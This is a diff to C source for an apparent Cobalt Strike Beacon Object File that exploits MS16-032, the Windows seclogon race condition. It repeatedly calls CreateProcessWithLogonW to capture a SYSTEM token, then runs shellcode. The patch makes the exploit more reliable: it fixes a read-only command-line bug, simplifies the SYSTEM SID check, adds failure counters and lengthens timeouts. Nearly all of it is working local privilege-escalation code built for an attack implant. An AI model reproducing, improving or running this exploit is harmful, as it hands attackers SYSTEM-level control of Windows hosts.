@@ -25,8 +25,8 @@
 /*                                                                     */
 /*  fFound/fStop use GCC __sync builtins for atomic access.            */
 /*  InterlockedExchange/InterlockedCompareExchange are compiler        */
-/*  intrinsics, NOT kernel32.dll exports, so they cannot be resolved   */
-/*  by the BOF loader. __sync builtins compile to inline lock cmpxchg  */
+/*  intrinsics, NOT kernel32.dll exports - the BOF loader cannot       */
+/*  resolve them. __sync builtins compile to inline lock cmpxchg       */
 /*  instructions with no DLL dependency.                               */
 /* ------------------------------------------------------------------ */
 
@@ -34,34 +34,18 @@ typedef struct {
     volatile LONG   fFound;         /* 1 = SYSTEM token found          */
     volatile LONG   fStop;          /* 1 = all threads should exit     */
     HANDLE          hSystemToken;   /* duplicated SYSTEM token         */
+    volatile LONG   nCreated;       /* child processes created (diag)  */
+    volatile LONG   nFailed;        /* CreateProcessWithLogonW fails   */
 } RACE_STATE;
 
 /* ------------------------------------------------------------------ */
-/*  Helpers                                                            */
-/* ------------------------------------------------------------------ */
-
-static int wcsstr_check(const wchar_t* haystack, const wchar_t* needle) {
-    int i, j;
-    for (i = 0; haystack[i] != L'\0'; i++) {
-        for (j = 0; needle[j] != L'\0' && haystack[i + j] != L'\0'; j++) {
-            if (haystack[i + j] != needle[j])
-                break;
-        }
-        if (needle[j] == L'\0')
-            return 1;
-    }
-    return 0;
-}
-
-/* ------------------------------------------------------------------ */
 /*  Token validation                                                   */
-/*  Checks: primary type, SYSTEM SID (S-1-5-18), system integrity.     */
+/*  Checks: primary type, SYSTEM SID (S-1-5-18).                       */
 /* ------------------------------------------------------------------ */
 
-static BOOL ValidateSystemToken(HANDLE hToken) {
+static BOOL IsSystemToken(HANDLE hToken) {
     DWORD      retLen;
     BYTE       userBuf[256];
-    BYTE       ilBuf[256];
     TOKEN_TYPE tt;
     LPWSTR     sidStr = NULL;
     BOOL       isSys;
@@ -82,24 +66,17 @@ static BOOL ValidateSystemToken(HANDLE hToken) {
             ((TOKEN_USER*)userBuf)->User.Sid, &sidStr))
         return FALSE;
 
-    isSys = wcsstr_check(sidStr, L"S-1-5-18");
-    KERNEL32$LocalFree(sidStr);
-    if (!isSys) return FALSE;
-
-    /* Integrity level should be System */
-    if (ADVAPI32$GetTokenInformation(
-            hToken, TokenIntegrityLevel, ilBuf, sizeof(ilBuf), &retLen)) {
-        TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL*)ilBuf;
-        SID*  pSid = (SID*)pLabel->Label.Sid;
-        DWORD rid;
-        if (pSid->SubAuthorityCount > 0) {
-            rid = pSid->SubAuthority[pSid->SubAuthorityCount - 1];
-            if (rid < SECURITY_MANDATORY_SYSTEM_RID)
-                return FALSE;
-        }
+    isSys = 0;
+    if (sidStr[0] == L'S' && sidStr[1] == L'-' &&
+        sidStr[2] == L'1' && sidStr[3] == L'-' &&
+        sidStr[4] == L'5' && sidStr[5] == L'-' &&
+        sidStr[6] == L'1' && sidStr[7] == L'8' &&
+        sidStr[8] == L'\0') {
+        isSys = 1;
     }
 
-    return TRUE;
+    KERNEL32$LocalFree(sidStr);
+    return isSys;
 }
 
 /* ------------------------------------------------------------------ */
@@ -108,6 +85,11 @@ static BOOL ValidateSystemToken(HANDLE hToken) {
 /*  Each thread repeatedly calls CreateProcessWithLogonW with          */
 /*  CREATE_SUSPENDED, opens the child's token, and checks if the race  */
 /*  caused seclogon to assign its SYSTEM token to the child.           */
+/*                                                                     */
+/*  CRITICAL: lpCommandLine MUST be a writable buffer (stack array).   */
+/*  CreateProcessWithLogonW documents it as [in,out] and may modify    */
+/*  the string. Passing a string literal (read-only .rdata) causes an  */
+/*  access violation that silently makes every call return FALSE.       */
 /* ------------------------------------------------------------------ */
 
 static DWORD WINAPI RaceThread(LPVOID lpParam) {
@@ -118,10 +100,11 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
     HANDLE               hDupToken;
     int                  iter;
 
+    /* Writable command line buffer - MUST be on the stack, not a literal */
+    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";
+
     MSVCRT$memset(&si, 0, sizeof(si));
-    si.cb          = sizeof(si);
-    si.dwFlags     = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    si.cb = sizeof(si);
 
     for (iter = 0; iter < MAX_RACE_ITERATIONS; iter++) {
 
@@ -133,18 +116,21 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
 
         /* The race target: CreateProcessWithLogonW
          * LOGON_NETCREDENTIALS_ONLY means seclogon does not validate
-         * the credentials, but still hits the token assignment path
+         * the credentials but still hits the token assignment code path
          * that contains the race condition.
          * CREATE_SUSPENDED keeps the child alive for token inspection. */
         if (!ADVAPI32$CreateProcessWithLogonW(
                 L"foo", L"bar", L"baz",
                 LOGON_NETCREDENTIALS_ONLY,
                 NULL,
-                L"C:\\Windows\\System32\\cmd.exe",
+                cmdLine,
                 CREATE_SUSPENDED | CREATE_NO_WINDOW,
                 NULL, NULL, &si, &pi)) {
+            __sync_fetch_and_add(&pState->nFailed, 1);
             continue;
         }
+
+        __sync_fetch_and_add(&pState->nCreated, 1);
 
         /* Open the child process's primary token */
         hChildToken = NULL;
@@ -152,9 +138,9 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
                 pi.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hChildToken)) {
 
             /* Did the child get SYSTEM's token from the race? */
-            if (ValidateSystemToken(hChildToken)) {
+            if (IsSystemToken(hChildToken)) {
 
-                /* Duplicate the token for later use */
+                /* Duplicate the token with full access for later use */
                 hDupToken = NULL;
                 if (KERNEL32$DuplicateHandle(
                         KERNEL32$GetCurrentProcess(), hChildToken,
@@ -173,13 +159,10 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
             KERNEL32$CloseHandle(hChildToken);
         }
 
-        /* Kill the child process - we got its token or it is not useful */
+        /* Kill the child - we got its token or it is not useful */
         KERNEL32$TerminateProcess(pi.hProcess, 0);
         KERNEL32$CloseHandle(pi.hProcess);
         KERNEL32$CloseHandle(pi.hThread);
-
-        /* Yield to let other threads compete in the race */
-        KERNEL32$Sleep(0);
     }
 
     return 0;
@@ -347,8 +330,8 @@ void go(char* args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT,
         "[*] MS16-032 Local Privilege Escalation");
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[*] CPUs: %d | Shellcode: %d bytes",
-        sysInfo.dwNumberOfProcessors, scLen);
+        "[*] CPUs: %d | Shellcode: %d bytes | Threads: %d",
+        sysInfo.dwNumberOfProcessors, scLen, NUM_RACE_THREADS);
 
     /* ---- Enable privileges ---- */
     if (ADVAPI32$OpenProcessToken(
@@ -372,9 +355,11 @@ void go(char* args, int len) {
             "[*] Attempt %d/%d - racing seclogon...",
             attempt + 1, MAX_EXPLOIT_ATTEMPTS);
 
-        /* Reset flags for this attempt */
-        state.fFound = 0;
-        state.fStop  = 0;
+        /* Reset state for this attempt */
+        state.fFound   = 0;
+        state.fStop    = 0;
+        state.nCreated = 0;
+        state.nFailed  = 0;
 
         /* Launch race threads */
         numThreads = 0;
@@ -392,7 +377,7 @@ void go(char* args, int len) {
 
         /* Wait for threads to finish their iterations */
         KERNEL32$WaitForMultipleObjects(
-            numThreads, hThreads, TRUE, 60000);
+            numThreads, hThreads, TRUE, 120000);
 
         /* Signal stragglers to stop */
         state.fStop = 1;
@@ -401,6 +386,19 @@ void go(char* args, int len) {
 
         for (i = 0; i < numThreads; i++)
             KERNEL32$CloseHandle(hThreads[i]);
+
+        /* Diagnostics */
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[*] Processes created: %d | Failed: %d",
+            (int)state.nCreated, (int)state.nFailed);
+
+        if (state.nCreated == 0 && state.nFailed > 0) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[-] CreateProcessWithLogonW always fails - is seclogon service running?");
+            BeaconPrintf(CALLBACK_ERROR,
+                "[-] Check: sc query seclogon | sc start seclogon");
+            break;
+        }
 
         if (state.hSystemToken) {
             BeaconPrintf(CALLBACK_OUTPUT,
@@ -412,7 +410,7 @@ void go(char* args, int len) {
     if (!state.hSystemToken) {
         BeaconPrintf(CALLBACK_ERROR,
             "[-] Failed to obtain SYSTEM token after %d attempts",
-            MAX_EXPLOIT_ATTEMPTS);
+            attempt);
         BeaconPrintf(CALLBACK_ERROR,
             "[-] Target may be patched - check for KB3139914");
         return;
